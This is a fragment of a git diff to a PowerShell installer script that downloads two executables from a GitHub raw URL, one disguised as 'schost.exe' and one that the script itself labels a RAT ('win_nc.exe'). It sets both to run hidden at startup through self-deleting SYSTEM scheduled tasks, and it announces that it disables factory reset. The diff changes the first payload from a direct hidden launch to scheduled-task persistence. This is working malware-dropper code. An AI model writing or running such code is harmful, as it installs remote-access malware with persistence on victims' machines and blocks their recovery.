@@ -15,13 +15,13 @@ New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 Write-Host "[3/7]" -ForegroundColor Cyan
 $schostPath = "$workDir\schost.exe"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/schost.exe" -OutFile $schostPath
-Start-Process -FilePath $schostPath -WindowStyle Hidden
 
 $ratPath = "$workDir\win_nc.exe"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath
 
 
 Write-Host "[4/7]" -ForegroundColor Cyan
+schtasks /create /tn "Schost" /tr "cmd /c start /b $schostPath & schtasks /delete /tn Schost /f" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
 schtasks /create /tn "Win" /tr "cmd /c start /b $ratPath & schtasks /delete /tn Win /f" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
 
 Write-Host "[+] Disabling Factory Reset......"  -ForegroundColor Red
